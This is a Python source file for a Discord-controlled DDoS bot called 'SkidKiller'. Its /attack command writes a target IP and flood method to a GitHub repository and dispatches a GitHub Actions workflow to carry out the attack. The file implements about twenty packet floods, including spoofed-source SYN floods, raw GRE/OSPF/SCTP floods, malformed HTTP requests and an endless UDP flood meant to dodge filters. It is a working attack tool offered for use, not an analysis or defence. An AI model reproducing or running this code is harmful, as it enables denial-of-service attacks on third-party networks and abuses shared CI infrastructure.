import os
import sys
import json
import random
import time
import socket
import discord
from discord.ext import commands
from discord import app_commands
from github import Github, GithubException
from datetime import datetime
import requests
from scapy.all import IP, TCP, UDP, Raw, send, RandShort

# Load environment tokens
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
GH_TOKEN = os.getenv("GH_TOKEN") or os.getenv("GITHUB_TOKEN")
if not GH_TOKEN:
    sys.exit(1)

# GitHub repo settings
REPO_NAME = "robster0969/anything2"
BRANCH = "main"
CONFIG_FILE = "trigger.json"

# Initialize GitHub client and HTTP session
g = Github(GH_TOKEN)
repo = g.get_repo(REPO_NAME)
session = requests.Session()

# Discord bot setup
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# List of attack method names
working_methods = [
    "tcp_chained_syn", "ssl_fragment_flood", "websocket_spam", "jumbo_payload_overlap",
    "http_mutator", "json_object_injection", "illegal_tcp_flags", "fake_protocol_mix",
    "gre_flood", "reverse_byte_flood", "igmp_bomb", "eigrp_flood", "ospf_flood",
    "l2tp_flood", "sctp_chunk_storm", "isakmp_flood", "ntp_amplify",
    "malformed_http_headers", "tcp_option_abuse", "coap_flood", "five_udp_flood"
]

# Attack implementations
def tcp_chained_syn(ip, port=80):
    spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
    send(IP(src=spoof, dst=ip)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
    for _ in range(3):
        send(IP(src=spoof, dst=ip)/TCP(sport=RandShort(), dport=port, flags="A"), verbose=0)

def ssl_fragment_flood(ip, port=443):
    s = socket.socket()
    try:
        s.settimeout(1)
        s.connect((ip, port))
        s.send(b"\x16\x03\x01\x02")
    finally:
        s.close()

def websocket_spam(ip, port=80):
    s = socket.socket()
    try:
        s.connect((ip, port))
        s.send(b"GET /ws HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n")
        for _ in range(10):
            s.send(os.urandom(1024))
    finally:
        s.close()

def jumbo_payload_overlap(ip, port=53):
    send(IP(dst=ip)/UDP(dport=port)/Raw(load=os.urandom(9200)), verbose=0)

def http_mutator(ip, port=80):
    headers = {"User-Agent": f"Mutator-{random.randint(1000,9999)}", "X-Custom": os.urandom(10).hex()}
    method = random.choice(["GET","POST","PUT","PATCH","TRACE"])
    session.request(method, f"http://{ip}", headers=headers, timeout=2)

def json_object_injection(ip, port=80):
    session.post(f"http://{ip}", json={"key": ["X"*500]*10000}, timeout=2)

def illegal_tcp_flags(ip, port=80):
    send(IP(dst=ip)/TCP(dport=port, flags="FU")/Raw(load=os.urandom(256)), verbose=0)

def fake_protocol_mix(ip, port=443):
    send(IP(dst=ip)/UDP(dport=port)/Raw(load=b"\x16\x03\x01" + os.urandom(512)), verbose=0)

def gre_flood(ip, port=0):
    send(IP(dst=ip, proto=47)/Raw(load=os.urandom(1024)), verbose=0)

def reverse_byte_flood(ip, port=123):
    payload = bytes([random.randint(0,255) for _ in range(512)])[::-1]
    send(IP(dst=ip)/UDP(dport=port)/Raw(load=payload), verbose=0)

def igmp_bomb(ip, port=0):
    send(IP(dst=ip, proto=2)/Raw(load=os.urandom(512)), verbose=0)

def eigrp_flood(ip, port=0):
    send(IP(dst=ip, proto=88)/Raw(load=os.urandom(1024)), verbose=0)

def ospf_flood(ip, port=0):
    send(IP(dst=ip, proto=89)/Raw(load=os.urandom(512)), verbose=0)

def l2tp_flood(ip, port=0):
    send(IP(dst=ip, proto=115)/Raw(load=os.urandom(1024)), verbose=0)

def sctp_chunk_storm(ip, port=0):
    send(IP(dst=ip, proto=132)/Raw(load=os.urandom(1024)), verbose=0)

def isakmp_flood(ip, port=500):
    send(IP(dst=ip)/UDP(dport=port)/Raw(load=os.urandom(512)), verbose=0)

def ntp_amplify(ip, port=123):
    send(IP(dst=ip)/UDP(dport=port)/Raw(load=b"\x17\x00\x03\x2a" + os.urandom(4)), verbose=0)

def malformed_http_headers(ip, port=80):
    headers_str = f"GET / HTTP/1.1\r\nHost: {ip}\r\n" + "\r\n".join(f"X-Hax-{i}: {os.urandom(100).hex()}" for i in range(10)) + "\r\n\r\n"
    s = socket.socket()
    try:
        s.connect((ip, port))
        s.send(headers_str.encode())
    finally:
        s.close()

def tcp_option_abuse(ip, port=80):
    opts = [(1,b"\x01"),(2,b"\x04\x05\xb4"),(3,b"\x03"),(4,b"\x02"),(8,os.urandom(8))]
    pkt = IP(dst=ip)/TCP(dport=port, flags="S", options=opts)/Raw(load=os.urandom(256))
    send(pkt, verbose=0)

def coap_flood(ip, port=5683):
    msg_type = random.randint(0,3)<<4
    code = random.randint(0,255)
    msg_id = os.urandom(2)
    token = os.urandom(4)
    coap = bytes([0x40 | msg_type, code]) + msg_id + token
    send(IP(dst=ip)/UDP(dport=port)/Raw(load=coap + os.urandom(12)), verbose=0)

# Map method names to functions after definitions
method_map = {name: globals()[name] for name in working_methods}

def five_udp_flood(ip, port=5357):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        while True:
            # Use random bytes for better obfuscation against filters
            payload = os.urandom(random.randint(1024, 65507))
            sock.sendto(payload, (ip, port))
            
    except Exception:
        pass
    finally:
        sock.close()

def runner_mode():
    cfg = json.load(open(CONFIG_FILE))
    func = method_map.get(cfg["method"])
    if not func:
        return
    end_time = time.time() + cfg["duration"]
    while time.time() < end_time:
        try:
            func(cfg["ip"])
        except:
            pass

@bot.event
async def on_ready():
    synced = await bot.tree.sync()
    print(f"Synced {len(synced)} commands")

@bot.tree.command(name="attack", description="Launch a SkidKiller attack swarm")
@app_commands.describe(
    target_ip="Target IP or domain",
    method="Attack method",
    threads="1-100",
    duration="10-3600 seconds"
)
@app_commands.choices(method=[app_commands.Choice(name=m.replace("_"," ").title(), value=m) for m in working_methods])
async def attack(interaction: discord.Interaction, target_ip: str, method: app_commands.Choice[str], threads: int, duration: int):
    if not (1 <= threads <= 100) or not (10 <= duration <= 3600):
        await interaction.response.send_message("Invalid parameters", ephemeral=True)
        return
    config = {
        "ip": target_ip,
        "method": method.value,
        "threads": threads,
        "duration": duration,
        "timestamp": datetime.utcnow().isoformat()
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)
    content = json.dumps(config, indent=2)
    try:
        # update or create trigger.json
        try:
            contents = repo.get_contents(CONFIG_FILE, ref=BRANCH)
            repo.update_file(contents.path, "Update trigger.json", content, contents.sha, branch=BRANCH)
        except GithubException as e:
            if e.status == 404:
                repo.create_file(CONFIG_FILE, "Create trigger.json", content, branch=BRANCH)
            else:
                raise
        # dispatch workflow
        workflow = repo.get_workflow("skidkiller.yml")
        workflow.create_dispatch(ref=BRANCH)
    except Exception as e:
        await interaction.response.send_message(f"❌ Operation failed: {e}", ephemeral=True)
        return
    await interaction.response.send_message(
        f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s) and dispatched workflow"
    )

@bot.tree.command(name="help", description="List methods")
async def help_cmd(interaction: discord.Interaction):
    await interaction.response.send_message("\n".join(working_methods), ephemeral=True)

@bot.tree.command(name="status", description="Show current config")
async def status(interaction: discord.Interaction):
    try:
        cfg = json.load(open(CONFIG_FILE))
        msg = (
            f"IP: {cfg['ip']} | Method: {cfg['method']} | Threads: {cfg['threads']} | "
            f"Duration: {cfg['duration']}s | Time: {cfg['timestamp']}"
        )
    except:
        msg = "No config"
    await interaction.response.send_message(msg, ephemeral=True)

if __name__ == "__main__":
    if os.getenv("RUNNER_MODE") == "1":
        runner_mode()
    else:
        bot.run(DISCORD_TOKEN)
